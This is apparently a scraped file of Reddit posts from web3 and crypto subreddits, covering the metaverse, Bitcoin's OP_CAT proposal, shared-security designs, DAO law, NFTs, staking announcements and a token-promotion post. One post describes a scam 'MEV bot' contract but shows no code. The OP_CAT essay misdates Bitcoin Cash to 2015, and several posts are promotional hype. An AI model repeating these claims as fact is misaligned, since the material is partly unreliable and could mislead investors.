"The Convergence of Web3, the Metaverse and Artificial Intelligence","i think the metaverse and web3 are as relevant now as they were, even more so in the wake of artificial intelligence. i was thinking about it this morning before i fly out to splitx to meet up with some tech luminaries like tony parisi, amy peck, avi bar-zeev and rika nakazawa. the metaverse in all its dimensions is going to need new levels of data orchestration that we may not have experienced before, well beyond iot or digital twinning for starters. the definition of the metaverse moving further outside of just another virtually immersive presence makes much more sense now; it crosses different realities that we know of (web, xr, vr, ar, physical, audio etc) and in order to manage this we’re going to need ai. ai is going to have to sit as a kind of glue that harmonises all that data across multiple boundaries and ensures that experiences can make sense wherever or whenever you are within them and that others who are there in whichever layer they happen to be in experiencing it with you are also getting the same. this is potentially where web3 comes into play. some of the core tenets such as decentralisation, open source and data sovereignty clearly have more of a part to play now to serve and protect individual interests around using ai. we’ve already seen the likes of midjourney and openai just not giving a flying f how they get the data to train their models so the idea of sovereignty to me is being pushed front and centre to not only have greater and more granular control over your own information but also the control to monetize it as you see fit if these centralised ai companies want to use it. we have to tell them what the value of our data is — not be dictated to the other way around. the idea of decentralisation makes more sense here too because there is no control under one ai model, but the data structures work both independently and together when called upon — we’re already seeing that now as there is more and more exploration of smaller ai models rather than larger generic ones. more highly tuned, specific smaller ai models working together potentially leads to agi even faster. an ai that understands the context of all the different layers of the metaverse is more likely to emerge as agi. ai itself moves far beyond having avatars doing our bidding or acting as some kind of customer service embodiment for brands. in fact, the idea of an embodied presence in the metaverse for help and guidance makes no sense at all. you don’t see the crew of the enterprise needing to speak to a virtual avatar to execute commands so why add this step in the metaverse? if ai is handling the orchestration then it knows what it knows and all you need to do is ask. when people talk about how ‘data is the new oil’ they miss the point — data is the music, ai is the conductor, web3 are the orchestral sections, and the concert hall is the metaverse. it’s going to be a fun weekend talking about convergence.",12,13,1.0,2023-05-25 15:38:00,web3,web3,DevilsRefugee,False,22.4

Unveiling the Potential of OP_CAT in Bitcoin: A Gateway to Magic or a Double-Edged Sword?,"in the ever-evolving landscape of bitcoin's scripting language, the proposal to reintroduce op\_cat, a new tapscript opcode, has sparked considerable debate within the cryptocurrency community. this essay explores the intricacies of op\_cat, its potential benefits for enhancing bitcoin's functionality, and the counterarguments against its adoption. **what is op\_cat ?** an opcode on bitcoin called op\_cat aids in increasing the range of operations that may be performed on the platform. concatenate, which is an acronym for join or combine two objects in programming code, is what the cat in op\_cat stands for. pcodes allow the bitcoin network to handle a variety of transaction types with varying sets of rules and circumstances. this ensures that the network remains stable and flexible to transactions. **this introduction sets the stage for exploring op\_cat's potential in bitcoin's scripting language, outlining its historical context, technical intricacies, and the divided opinions within the cryptocurrency community** **i. understanding op\_cat: a concatenation opcode** op\_cat, short for ""concatenate,"" is a proposed opcode designed to allow the concatenation of two values on the stack in bitcoin's scripting language. if activated, op\_cat would facilitate the merging of two values, providing a versatile tool for developers to create more expressive and powerful smart contracts. **op\_cat, aimed at concatenating values in bitcoin's stack, could enhance script expressiveness, though its historical deactivation raises crucial security considerations.** **ii. the promise of op\_cat: unlocking bitcoin's potential** expressiveness and power of tapscript: bitcoin tapscript currently lacks a general-purpose method for combining objects on the stack, limiting the expressiveness and power of tapscript. op\_cat aims to overcome this limitation, offering a simple yet powerful opcode to concatenate stack values. expanded functionality: op\_cat could significantly expand bitcoin's capabilities by providing a general-purpose way to concatenate stack values. this opens the door to constructing and evaluating complex data structures, such as merkle trees and hashed structures, within tapscript. use cases for op\_cat: the proposed opcode introduces a myriad of potential use cases, ranging from enhancing atomic swaps for decentralized file hosting to enabling tree signatures, post-quantum lamport signatures, non-equivocation contracts, vaults, and replicating checksigfromstack for advanced contracts. in the other hand, ""op\_cat was one of the opcodes that satoshi nakamoto deactivated. this is because, by utilizing op\_dup (duplicate) and op\_cat (concatenate) to continuously put a 1-byte value onto the stack, the script size can grow to be more than 1 terabyte, which increases the likelihood of a denial-of-service (dos) attack due to a geometric growth in memory usage. nowadays, though, it's considered that this is not an issue because tapscript sets a 520 byte maximum for stack elements. as a result, op\_cat has a bip proposed. a universal mechanism for concatenating stack values is introduced by op\_cat, which improves efficiency and expressiveness. as an illustration: one can limit currency usage by requiring a particular transaction. this entails requiring the same output script in order to link coins to a certain address. for example, ""if you sign this document, you can take up to 1 btc from this output, and the rest must go to this change address."" this precisely dictates which specific transaction templates are authorised. still, there are issues with op\_cat as well. the effect that op\_cat will have on the bitcoin network is unknown, even with the 520-byte limit. furthermore, users can write intricate scripts and conceal them behind a hash using the pay to script hash (p2sh) feature of the bitcoin scripting system. the full script is pushed onto the stack during p2sh transactions, and it is constrained to 520 bytes. bigger multi-signature scripts are so restricted, with n/15 serving as the highest limit for p2sh multi-signature scripts, thereby prohibiting the use of bigger multi-signature scripts. **this section highlights op\_cat's promise in expanding bitcoin's capabilities, with potential applications in complex data structures and advanced smart contracts.** **iii. arguments in favor of op\_cat: building a magical bitcoin** innovation in smart contracts: op\_cat offers a tool for developers to innovate and create more sophisticated smart contracts, expanding the possibilities for decentralised applications on the bitcoin blockchain. efficiency and simplification: the simplicity and modularity of op\_cat align with the unix philosophy, making it a valuable addition to the tapscript toolbox. it can simplify scripting, making it more accessible and efficient for developers. cost-effective solutions: the proposed opcode could potentially lead to cost-effective solutions for secure document signings and other applications, reducing the need for complex cryptographic techniques. future-proofing with quantum-safe measures: op\_cat is designed with quantum-safe measures, ensuring that signatures on the blockchain remain secure even as technology advances, contributing to the future-proofing of bitcoin. **summarizing the favoring arguments, op\_cat is seen as a tool for innovative smart contracts, efficiency, and quantum-safe measures, contributing to bitcoin's future-proofing** **iv. counterarguments against op\_cat: navigating potential pitfalls** security concerns: the historical removal of op\_cat in early bitcoin versions due to potential memory usage issues raises valid security concerns. careful mitigation strategies must be in place to prevent new vulnerabilities and potential denial-of-service attacks. script size inflation: uncontrolled use of op\_cat could lead to larger scripts, consuming more resources and potentially impacting transaction fees. measures to prevent abuse and optimise script execution are essential. community resistance: implementing major changes like op\_cat requires consensus within the bitcoin community. resistance may arise from those advocating for simpler, minimalist approaches and those concerned about potential risks. alternative softforks: prioritising other softforks addressing core issues like scalability or privacy might be favored over introducing new functionalities like op\_cat. it's important to note that when discussing the potential reintroduction of op\_cat, it's crucial to revisit its original deactivation in 2010. satoshi nakamoto made this decision, emphasising a precautionary approach that prioritised network security and stability over expansive scripting capabilities. the deactivation of op\_cat was driven primarily by concerns about script-based vulnerabilities that could be exploited for denial-of-service (dos) attacks. this decision underscores the early understanding of bitcoin's scripting power and its potential security implications at that time. **the counterarguments emphasize concerns about security risks, script size inflation, community resistance, and prioritizing other core bitcoin improvements.** **v. different perspectives on enabling op\_cat and cryptocurrency** several bip proposals have been written regarding op\_cat, including one by ethan heilman. first of all the github repository for bitcoin improvement proposals (bips) is a comprehensive collection of documents proposing changes and improvements to bitcoin. each bip is a separate file, usually named with a specific bip number, and contains detailed information about a proposed change, including its purpose, design, and potential impact. the repository serves as a central reference point for developers and participants in the bitcoin community to understand, discuss, and contribute to the ongoing evolution of bitcoin. the draft of heilmann addresses op\_cat's history, its previous deactivation, and proposes measures to mitigate past issues. it aims to enhance bitcoin's scripting capabilities, emphasising op\_cat's potential in various applications. the draft provides a detailed technical overview and rationale for its reintroduction. the proposal: \- revisits the historical context and utility of op\_cat in early bitcoin versions. \- addresses the security concerns that led to its deactivation. \- proposes safeguards to prevent these issues in its reintroduction. \- discusses how op\_cat can expand bitcoin's scripting capabilities and the potential applications it enables. furthermore in may 2015, bitcoin cash implemented an update that included the addition of various opcodes, including op\_cat. unlike btc core, certain opcodes like op\_cat are active in bch. blockstream is a company that develops products and services related to storage and transfer, among other things, of btc. they explored the capabilities of op\_cat in their alpha script. one discovery was related to scaling. the update made it possible to achieve a logarithmic scaling method, doubling the number of valid public keys with a constant increase of 40 bytes. in comparison, in btc, adding a separate public key is equivalent to 34 bytes. also, there was an examination of the relationship between merkle trees and schnorr signatures using opcodes. it was found that it was possible to create single large combinations of m-of-n multisig. so the use of opcodes can contribute to more efficiency and streamlining on btc. liquid btc is a bitcoin layer-2 solution enabling fast, confidential settlement & issuance of digital assets. like bth, liquid btc also has op\_cat, along with other features such as csfs and 30 additional helper opcodes. this development was discussed in more detail in connection with checktemplateverify (ctv) and bitcoin development on x by some experts. their conclusions: \- ctv's functionality and implementation: there's a focus on the potential and limitations of ctv in enhancing bitcoin's programmability and scalability. \- governance and consensus building: the conversation reflects on how changes in bitcoin are proposed, debated, and potentially implemented, highlighting the community-driven nature of decision-making. \- security and misuse concerns: discussions about the risk of government misuse of multisig wallets and the potential for recursive covenants to be used nefariously. \- technical innovations vs. centralization risks: balancing the need for technological advancements in bitcoin with the ethos of decentralization and security. in addition an email from 2022 discusses the challenges and potential solutions for getting soft fork ideas, like opcodes variations, from concept to deployment in the bitcoin network. the author, aj at erisian.com.au, proposes the concept of ""bitcoin-inquisition"" to facilitate this process. the process is a complex one that requires technical excellence, community consensus, and a deep understanding of the network's fundamental principles. also it’s important to maintain decentralization in the evaluation process of soft fork proposals in bitcoin. the email proposes an alternative approach that involves multiple phases. this approach aims to avoid the centralization of decision-making and ensure that the bitcoin network remains trust-minimized and decentralized. further the email suggests that one way to make it easier is to demonstrate a soft fork's functionality and benefits is to deploy it on the default global signet as soon as it has a fully specified proposal and a high-quality implementation. however, it also acknowledges the challenge of merging the code into bitcoin core before thorough evaluation(conundrum), leading to the proposal of the ""bitcoin-inquisition"" fork as a potential solution to this conundrum. the solution is called ""bitcoin-inquisition."" this fork would branch from stable releases of bitcoin core and add support for proposed consensus changes, such as checktemplateverify (ctv), anyprevout (apo), taproot (tluv), op\_cat, etc. so the ""bitcoin-inquisition"" fork facilitates the testing and evaluation of proposed changes in a controlled environment before they are considered for inclusion in the main bitcoin core software. afterward successful testing with the help of ""bitcoin-inquisition"" fork. the email provides a framework for developers to work on these changes, like newly implemented opcodes, test them on signet, and collaborate to ensure their quality and suitability before potential integration into the main bitcoin core software. soft forks could result in challenges while making improvements to the bitcoin protocol. important is to avoid hard forks and network disruptions. so the email suggests an abandonment mechanism. this mechanism allows a soft fork to be abandoned if it is deemed necessary. also the quality of the code is important, some criteria may not be met. contributions, reviews, and community participation are encouraged to influence and maintain the development standards of this specialized fork. high-quality code and thorough testing are essential to ensure the reliability of the evaluation and testing environment for proposed soft forks. the following step after the testing, on the ""bitcoin-inquisition"" fork and signet, is to base ""bitcoin-inquisition"" on stable releases of bitcoin core. this choice is driven by the desire to minimize code conflicts, facilitate backporting, ensure stability, and provide a reliable starting point for developers involved in the evaluation and testing of proposed consensus changes within the fork. finally it’s important to avoid centralisation and undue influence in the context of ""bitcoin-inquisition"" and its role in evaluating soft forks. decentralised principles should be maintained. the miners or maintainers of ""bitcoin-inquisition"" should not have the ability to unduly promote or block proposals without community consensus. the goal is to preserve the peer-to-peer nature of the bitcoin network throughout the evaluation and testing process. in conclusion, the email discusses a comprehensive process as a means to activate op\_cat. however senator elizabeth warren expresses deep skepticism about cryptocurrencies in general. her concerns center on the lack of transparency and regulation in the crypto industry, contrasting it with the established regulatory framework of traditional banking. warren's comments reflect broader regulatory and societal concerns about the rapid growth and volatile nature of cryptocurrencies, the potential for misuse, and the challenges in integrating them into the existing financial system. her stance signals a call for more robust regulatory measures to ensure consumer protection and financial stability in the face of this emerging technology. **this section examines the varied perspectives on op\_cat, including bip proposals, community discussions, and implications for bitcoin's development.** **vi. conclusion: striking a balance in bitcoin's evolution** in conclusion, the potential reintroduction of op\_cat into bitcoin's scripting language presents both exciting opportunities and valid concerns. striking a balance between innovation and security, between expanded functionality and potential drawbacks, is crucial. as bitcoin continues to evolve, community consensus and careful consideration of the trade-offs will determine whether op\_cat becomes a magical tool in shaping the future of bitcoin or a potential challenge that requires alternative solutions. **concluding the discussion, the reintroduction of op\_cat offers both opportunities and challenges, requiring a balanced approach between innovation and network security in bitcoin's evolution.**",16,10,0.88,2024-01-20 13:40:58,web3,CryptoTechnology,deadwings13,False,22.4

Interchain Security and Eigen Layer: comparing the anatomy of two systems of shared security,"**tldr at the bottom** ***intro*** two systems of shared security have peaked my interest lately, as they are somewhat reminiscent of each other, as the ethereum ecosystems looks for the best way to scale out its network. while ethereum attempts to scale its network out as much as possible, the cosmos ecosystem is looking to eliminate the fragmented security issue it deals with, throughout its rapidly growing ecosystem. let’s discuss the fundamentals of both models: ***interchain security:*** *interchain security* allows for new or existing blockchains, to skip the line of finding validators and let’s them hook into the existing atom validator set. this means that projects can retain sovereignty, have fees on chain paid in their native currency and lease the cosmos hubs economic security. the hub validators, in the scenario of running a new ics consumer chain, will need to run a new node to validate this new network. with this being the case, the validators will also have specific requirements regarding liveness, double signing and other actions that would result in a slashing/jailing. however, rather than this slashing or jailing happening on the consumer chain, it will be their atom stake, that is at risk of a slash or jailing, making the economic security linked to atom’s economic security. **what does it take from the protocol to be added to ics?** the chain has to be approved via atom governance. in this approval process they need to show as much info as possible to ensure this addition to the validator set will be worth the extra work a validator will have to do. but while this provides more work, it could show even more profit for atom validators and stakers. these chains that lease atoms validator set, will be paying the atom validators and stakers in their native currency. or they could pay fees in any fee token, that the consumer chain utilizes (so this could mean atom or another ibc native currency, could be used rather than the consumer chain having its own token). this additional yield will be on top of the staking rewards from atom (20% at time of writing). ***eigen layer*** eigen layer is a fascinating project, being built on ethereum to allow for outside projects and chains to utilize ethereum validators in a way by which ethereum validators can opt-in to validate a specific outside chain, and they will have specific requirements to meet, in order to not result in a slashing event. essentially, under the eigen layer, it acts as a sort of middleman to execute slashing events, in the case of a misbehaving validator, and on behalf of a blockchain. however, instead of being a blockchain in itself, eigen layer is a smart contract on both ethereum, and the new blockchain which each validator is responsible for validating. **let me explain alittle more in depth** in the eigen layer model, an ethereum validator will be able to opt-in to validating a new blockchain, utilizing the stake they ready have locked in their mainnet ethereum stake. this process is called *restaking*. the act of restaking, your stake, towards a new blockchain. when these validators opt-in, they have to spin up a new node running the specific code of the new blockchain, as well as the eigen layer smart contract on both chains. this new node, will communicate with the eigen layer contract, about the parameters required for the validator to run this new node, as well as the slashing conditions for this new chain. if a blockchain finds a validator performing a malicious act, such as a double sign, for example, this blockchain will send a message to the smart contract on its chain, which will relay a message to the ethereum mainnet contract, which will then unbond the ethereum stake, slash the stake and send the remaining stake, to the validators receiving address. this slashing mechanism, provided by the eigen layer smart contract, acts as a mechanism to keep the validator honest while validating the new blockchain. it also means that validators that opt-in to validate new chains, will likely find various new forms of revenue coming from chains seeking ethereum’s economic security. ***comparisons and conclusion:*** interchain security and eigen layer have very many similarities, in fact, eigen layer actually tends to have many more direct similarities to interchain security v2, aka, opt-in security. this model makes it possible for cosmos hub validators to opt-in to specific blockchain that they may want to validate. in which case they have the exact same risk/reward set as v1 has. however, the differences lay in the fundamentals of the base protocol of the security source. for example, the cosmos hub is built with ibc enabled. this makes general message passing, such as a message from a consumer chain to the hub, regarding a slashable event seamless and wit no central trusted party performing such this task of message passing, as the functionality is built directly into the base protocol. eigen layer does not have this specific base layer functionality, and will have to rely on a seperate form of message passing, to inform the eigen layer on ethereum mainnet to slash a validator. in my research, it had not become totally apparent what method will be used for message passing, however, if there is a multisig used in it, then there is a general risk associated that is not associated with how interchain security is designed. however, it would be welcome to hear that the general message passing of slashing packets from eigen layer is fully decentralized and trustless. **tldr; two systems of shared security, between cosmos and ethereum are being brought to market. both of these aim to give devs sovereign control over the blockchain, while they outsource their block producing to an established set of validators with a large amount of economic security.** **the differences are in the levels of the network at which they lay, with interchain security being at the base layer of the cosmos hub and eigen layer just being a smart contract between two chains. however, both seek to make the process of building a blockchain more efficient through the model of shared security with no initial overhead for the devs to worry about, with regard to economic security.** **tldr edit; also, a difference in the architecture is that the cosmos hubs interchain security utilizes ibc as its general message passing protocol, to send slashing/jailing packets. where eigen layer connected chains will likely have to use a bridging protocol, which hopefully will be extremely effective and secure, rather than a simple 5/8 bridging protocol.**",14,13,0.86,2023-05-28 21:00:06,web3,CryptoTechnology,Jcook_14,False,22.200000000000003

Tennessee Becomes Second State to Pass DAO Legislation,"tennessee, which is notorious for being behind the times when it comes to progressive legislation, is on the cutting edge this time. tennessee has become the second state to enact laws recognizing and allowing llc registration of decentralized autonomous organizations, also known as daos (pronounced ""dows""). wyoming was the first state to pass laws along these lines. daos are decentralized autonomous organizations (daos) that are led by computer code rather than human leaders. consider a dao to be a corporation, except instead of shareholders voting, it uses blockchain to make choices on behalf of its users based on a set of rules. they're made to allow strangers to collaborate safely, transparently, and effectively over the internet. the bill's proponent, state house rep. jason powell (d-nashville), claims the freshly passed legislation will make tennessee ""the delaware of daos”, there are several daos out there like the crystal dao and the heritage dao and this is an encouraging movement. it now needs just gov. bill lee's signature to become law. he claims that ""with this new corporate structure, tennessee will be a beacon for blockchain investment, new jobs, and investment."" ""in the same way that delaware has become a hotspot for traditional llcs and south dakota has become a hub for credit card businesses,"" says the author. the bipartisan bill, which passed overwhelmingly in the house and senate, has been praised by members of the business and it industries. the measure is ""groundbreaking,"" according to ron shultis, director of policy and research for tennessee's beacon center. ""this bill creates a forward-thinking regulatory environment, signaling to investors and entrepreneurs that tennessee is the place to be and invest,"" shultis said. mike audi is the creator of tiki, a digital firm based in nashville's downtown area. he believes that this legislation will add gasoline to the fire of tennessee's burgeoning it sector. according to audi, ""nashville is gradually becoming a hub for web3 firms."" ""expect to see more of it if favorable legislation is passed. ""founders will flock here to develop, build, and stay."" many, if not all, businesses who have established daos in wyoming aren't actually based or operating in wyoming, according to audi. for many people, wyoming is just a place to register. however, tech businesses are flocking to nashville for what they see as a business-friendly atmosphere and burgeoning tech ecosystem, including his own, which relocated to nashville last year. many, if not all, businesses who have established daos in wyoming aren't actually based or operating in wyoming, according to audi. for many people, wyoming is just a place to register. however, tech firms, including his own, which migrated to nashville last year, are thriving.",19,4,0.92,2022-04-10 13:28:12,web3,web3,Ok_Effect265,False,22.200000000000003

As web dev, should I look for career change?","hi all, recently i am spending many hours learning airdrop farming on dapp, then i saw videos from dapp university [here](https://www.youtube.com/watch?time_continue=1&v=rncxnlesv5a). he claims that dapp job (or blockchain developer job?) are great career option in 2024, as demand for labor is far larger than supply, remote friendly, don't need very technical background, has great potential to grow. i am a self-taught web dev with 1.5 year of experience, doing frontend and backend. from his video it sounds that it is not that difficult to learn the necessary skill to be hirable for building dapp. i am no genius programmer but i always put a lot of extra hour to sharpen my skills. i wonder if it is as good as he claims, if yes and i can find a job that allow me to remote (i located in hong kong) and pay me 60k usd per year (in crypto?), that is a huge step up for me plus web3 field looks a more interesting. another factor is, it is bull market for crypto now, the network i am following, blast l2, has 2 billion usd tvl after being announced for few months.. the total airdrops from various project in previous years is more than 10 billion usd. what do you think? i think dapp unniversity certainly has incentive to exaggerate the upside of being dapp developer, so i come here to ask.",7,25,0.77,2024-03-01 02:35:32,web3,ethdev,Ashamed-External-330,False,21.9

Why Is Web 3.0 Important?,"# general conclusion in early 2021, we had discussions on the idea of building a decentralised internet, commonly referred to as web 3.0. * in the united states president trump has been banned from using twitter, and parler, which uses aws services, has been removed from playstore and appstore. * whatsapp has announced that they will share information with their parent company facebook * uganda has ordered internet service providers to block all social networking platforms these are important and understandable issues and need to be actively discussed.small businesses and startups rely on facebook advertising services, google search suggestions, and amazon's aws service to survive. artists and creators face the risk of having their information deleted from sites like spotify, instagram and tiktok. although these are not new problems, it is becoming more and more serious. the development of technology monopolies and their scalability to information privacy rights and personal freedoms has spurred the internet transition from web 2.0 to web 3.0. # what is web 3.0? web 3.0 (commonly called web3) is a reform model aimed at democratising the internet. web 3.0 is present in the crypto space and other digital fields such as ai, virtual and augmented reality, and more. by applying new technologies, web 3.0 is changing how we, as a collective, view and value the internet. web 3.0 is about creating an internet that works for everyone, owned by everyone. # where web 3.0 comes from the term was originally coined in 2014 and popularised in 2018 by ethereum co-founder and polkadot founder gavin wood. the spirit of this term goes back to when satoshi developed bitcoin and advocated decentralised dns called bitdns. >“i think it would be possible for bitdns to be a completely separate network and separate blockchain, yet share cpu power with bitcoin.” - satoshi (2010) dns has long been controlled by organisations such as verisign and the internet corporation for assigned names and numbers (icann) overseen by the us department of commerce. this centralised control of dns has been used to enforce ip rights, prohibit websites from selling copyrighted material, censor free-of-speech sites like wikileaks and seize domain names (ip addresses) without proper procedures, etc. censorship decisions are usually influenced by the top levels of government and the lobbyists of the largest multinational organisations, who may not always be acting in the best interests of the general public.satoshi and other bitcoin enthusiasts recognised this. in 2011, a fork of bitcoin called namecoin was born to allow censorship-proof domains at *.bit* domain addresses.namecoin was ahead of its time. a proxy service or extension (such as metamask today) was required to log in at the *.bit* domain, making it very difficult to use. plus, most people did not want their own website or personal domain at that time. all of this caused namecoin to fail because of low demand from its users.ten years later and now new blockchains and decentralised services may be ready for success. these applications are making the internet more decentralised with web 3.0. another example of such infrastructure is the handshake network. # conclude the early internet needed avant-garde programmers and businesses to develop new products to make the internet useful and to be rewarded for the value they created. no one knows in advance what the consequences of their construction will be.cryptonetworks, with their open-source protocols and everyone-owned networks, offers the opportunity to restructure the internet into a system that benefits more people around the world. this is a vision worth striving for.the world evolving today is increasingly controlled by technology, so we must design systems that benefit the collective. the transformation of the internet, from web 2.0 to web 3.0, is diverse and will change the way we interact with the internet.",14,10,0.94,2021-10-07 19:52:43,web3,web3,economicsdesign,False,21.799999999999997

Could There Still Be A Good Reason Web3 Wallets Aren't Supported In Every Form Of Crypto Payments?,"it is not much spoken about but for other cryptocurrency forms like nanocurrency, aside from solving the spam issues, the next closest thing holding nano back is the lack of a web3 wallet similar to metamask. yes a lot of people do accept nano payments but yet it's not a very user friendly process. let's say for a customer paying for a web upgrade. they have to copy-paste the nano address or scan a qr code with their phone. then website owners have to manually verify the transaction and upgrade their account. it would take me all of 10 minutes to add a metamask or phantom (solana) plugin that enables users to log in with their solana or ethereum address, pay with sol or matic or eth directly from their browser, then automatically upgrade their account. this type of tooling does not exist for nano and also some exchanges like bisq, yet it's crucial, because it would actually allow for retailers like me to easily integrate nano into their websites. i'm aware of nano.to but it doesn't really solve this issue. shouldn't have to open a new tab or go to a different application like nault or atrium when the standard for every other web3 interaction is being connected via a browser extension. could there be a valid reason this development isn't ready yet? maybe it will take tools like the google open source movement or tea, a revolutionizing open‐source leveraging blockchain and web3 to ensure fairness and equitability for the developers who power the internet to influence developers who could maybe look into the challenge. if we want adoption from the average person outside of the commercial use cases the nf is working on, we definitely need the proper tooling for non-developers to easily integrate payments into their websites.",17,5,0.95,2022-05-20 15:12:04,web3,web3,Bonilladke,False,21.7

Changing the code to scam the scammer?,"hey all - i'm a novice solidity developer (background in js/react) and was messing around with what appeared to be (and was) one of those scam ""mev bot"" tutorials just to see what would happen. if unfamiliar, below is the code. another redditor edited it to reveal the malicious receiver's concealed wallet address (displayed as maliciousreceiver). basically the scam involves a frontend that looks like remix with a 'start' and 'withdraw' button. you deploy a contract, fill the contract manually with eth, then hit 'start' in the fake remix frontend, and it sends the eth to the scammer's concealed wallet address. [https://pastebin.com/s3dvljl1#google\_vignette](https://pastebin.com/s3dvljl1#google_vignette) except that this didn't happen to me?

Some thoughts on NFT's,"by now most people know that one of the most powerful things about nft's is that they are digital items that behave like they are physical. what less people realize is the other side of that equation: physical items that behave as if they are digital. let me illustrate... **turing completenes** nft's are universally programable via smart contracts. whatever functionality you can program into a normal app, nft's can do in principle. this universality allow nft shape shift into many things simultaneously not just one thing at a a time. **combinatory** each individual nft can be combined with other nfts to create a complete picture and unlock all sorts of features/rewards. imagine you have to collect or pool (via dao) 20 nfts to turn them into a clue for the next airdrop. **transmorphability** nfts can be programmed with emergent functionality. imagine a collection of generative artworks that looks and behave one way individually but when you own 5 of them changes into something completely different. (think megazord from power rangers ) **daisy chaining** nft's can have conditions built which have to be met to unlock access to other nft's. this allow you to create anything from murder mysteries, to treasure hunts, to level creation (scientologists rejoice) and any progressive certification fully automated. **derivative** u/lootproject showed us that you can even turn everything on its head by providing abstract idea nft's (called loot backs) and then have a community build a whole universe around them using derivatives called synthetic loot as the incentive structure. we haven't even begun to scratch the surface of what is possible. only imagination, experiments and the law of computation sets the limits for what is possible. i haven't been as excited about the prospect of anything since the early days of the internet.",18,6,0.8,2022-01-07 11:01:04,web3,web3,ThomPete,False,21.2

Help scale Rocket Pool and support decentralized node operators!,"hi r/ethereum, i’m one of the co-founders of nodeset, the developer of [constellation](https://nodeset.medium.com/project-hyperdrive-4819f22391dc), a “layer 2” staking protocol built on top of rocket pool! the main innovations of constellation are xreth, a liquid eth staking token with zero fees on ethereum staking rewards (including mev), and xrpl, a liquid staking token for rpl. gravita is launching the first public constellation deployment on mainnet today, and [minting these tokens is now available via the gravita website!](https://app.gravitaprotocol.com/constellation/xreth) once minted, the constellation contracts non-custodially distribute the assets among nodeset’s hundreds of decentralized operators, funding the operator bond (currently 8 eth + 2.4 eth or rpl) and unlocking their ability to deploy rp validators at scale. we’ve spent the last 18+ months building both a robust (250+) and vetted cohort of independent node operators, including solo stakers, rocket pool operators, and small staking businesses. nodeset’s mission is to connect the long-tail of decentralized operators that make ethereum the most credibly neutral settlement layer in the world to compute opportunities across the ecosystem. constellation, our first major project, supports the protocol that got us started on our journey as a company, rocket pool. over the last year, rp has faced scaling challenges due to its bonding requirements, which has resulted in contraction of the protocol. constellation was designed to alleviate those challenges while improving rocket pool’s underlying asset distribution. with nearly 40,000 eth sitting in the reth deposit pool, it’s time to unleash constellation and grow ethereum’s most decentralized liquid staking protocol! for those interested in diving deeper into the technology, please [take a look at the constellation documentation](https://docs.nodeset.io/constellation). there’s a lot of work remaining, but we will be adding more information over the coming weeks, and [the gplv3 code is available on our github](https://github.com/nodeset-org/constellation), of course. on the security side, we recently [concluded three audits from some of the best in the business](https://github.com/nodeset-org/constellation/tree/main/audits) like chainsafe and sigma prime, and [our bug bounty program details are located in the documentation](https://docs.nodeset.io/constellation/security-information). speaking of… if you’re interested in participating as a nodeset operator, you can sign up for free at [nodeset.io/join](http://nodeset.io/join) – you’ll get paid in eth to help decentralize ethereum!",16,5,0.94,2024-10-15 20:53:10,web3,ethereum,NodeSet_Nick,False,21.0

Alpha Drop App Expanding to Solana - A Game Changer for the Ecosystem!,"hey solfam, just wanted to share some exciting news that's flying under the radar. you know alpha drop? that app where you can find the next big crypto gems before they blow up? well, guess what - it's coming to solana! now, i've been in the crypto space for a while, and let's be honest, solana has had its share of ups and downs, especially with all the rug pulls and fake kols (key opinion leaders) promoting garbage projects. it's been tough to sift through the noise to find genuine, promising projects. enter alpha drop. this app isn't just for eth anymore. if you're like me, always on the hunt for that alpha, this could be a massive shift for us solana users. here's why: * scam filter: with all the scams out there, having a tool that helps vet projects is invaluable. alpha drop has been doing this for ethereum, and now it's our turn. * discover hidden gems: solana's full of potential, but finding those projects before they go parabolic has been like looking for a needle in a haystack. alpha drop might just light up that needle for us. * community validation: the app thrives on community input. we've got a strong community here, and with alpha drop, we can collectively highlight projects with real potential. * $peiro on eth: sure, some might argue $peiro is ethereum-focused, but knowing our devs, they're all about inclusivity. bringing alpha drop to solana means they're thinking about the broader crypto community, not just one chain. i'm genuinely hyped about this. it's like getting an early bird ticket to the best projects before they take off. and for those of you worried about missing out, keep your eyes peeled for the test integration. i'm sure we'll get a chance to dive in, test the waters, and help refine the app for solana. what do you guys think? is this the tool solana needed to clean up its act and boost genuine innovation? let's discuss! * stay vigilant, stay excited, and let's hope alpha drop brings some real alpha to our favorite chain. cheers,",10,14,0.92,2024-11-20 14:02:00,web3,solana,Resident_Blueberry_5,False,20.800000000000004

Layer 0: The Moral Case for Web3,"this is going to be somewhat lengthy so buckle up. there is a big jar of 🪙crypto at the end of the 🌈 rainbow ;) recently a group of important voices have come out against web3. these aren’t the usual technology adverse critics but rather voices that are in general pro technological innovation; people like jack dorsey and tim o’reilly but also others like levi from box.com and large parts of the entire gaming community also seems to have an issue with the fundamental morality of the web3 project. this should be taken seriously but instead of getting into a tit-for-tat with their claims i would like to zoom out a little bit more and try to explain why web3 is not just a great technical innovation, it’s also morally superior to any societal solution we currently have, rendering the objections by critics moot. let's start with the obvious question: why do we need a moral case for blockchain? the answer is actually quite simple. any claimed solution to a problem, potentially affecting humans at large scale, need to to deliver on at least 4 axises. * non-coercive * fundamental * transparent * better problems and, it needs to actually improve at orders of magnitude higher. **non-coercive** a moral solution doesn't need to be forced, it will prove itself by improving the circumstances for those embracing it. only through volunteer adoption can a solution said to be moral. **non-exclusive** people who adopt the solution later aren't in principle excluded from participating in the upside early adopters enjoyed. early adopters aren't in shielded from the downside of those adopting late. **transparent** a morally superior system is not afraid of its own logic or the axioms it's built upon. in fact the superiority hinges on the accessibility of the rules and the reasoning governing the system. **better problems** there is no such thing as a perfect solution. all solutions come with their own unique problems. the crucial difference is whether those problems are better problems to have than those it replaced. **ok but what problems does web3/crypto actually solve?** at its core crypto solves the problem of trust. this might sound underwhelming but once you start thinking about how many things in society are based on trust you quickly realize how important solutions to this problem are. trust in your friends, trust in your colleagues, trust in local government, federal, police, legal system, neighborhood, financial system, economic policies, the market, companies, ownership, your self! i could go on. nothing work without trust... however trust isn't itself enough, trust needs a mechanism to function. very few relationships can be self-governed and require some sort of non-partisan transparent mediator to ensure that people with different, often opposing interest can trust the outcomes affecting them. the magnum opus of this effort is the 3 branches of government separating the legislative, executive and judicial powers plus an error correcting mechanism through regular elections ensuring representation of everyones interests at least in theory. the ingenuity of this invention historically cannot be emphasized enough. it's trough this, we've been able to build the myriad of institutions locally, nationally and internationally. it's ensured an equilibrium of trust between non-trusting parties. at least until now. all systems have a limit to how much they can scale, be internally consistent and still effective. with the advent of globalization through the use of technology, the sheer scale of ""cases"" that require mediation through 3rd parties is nothing short of a cambrian explosion. the current system, built post 2nd world war worked when there were few banks, airlines, academics and no home computers. it wasn't made for millions of investors, dronepilots, 100's of millions of academics and billions of smartphone users able to retrieve and collaborate. there is so much information, so many perspectives and competing interests (obvious and non-obvious) at ods 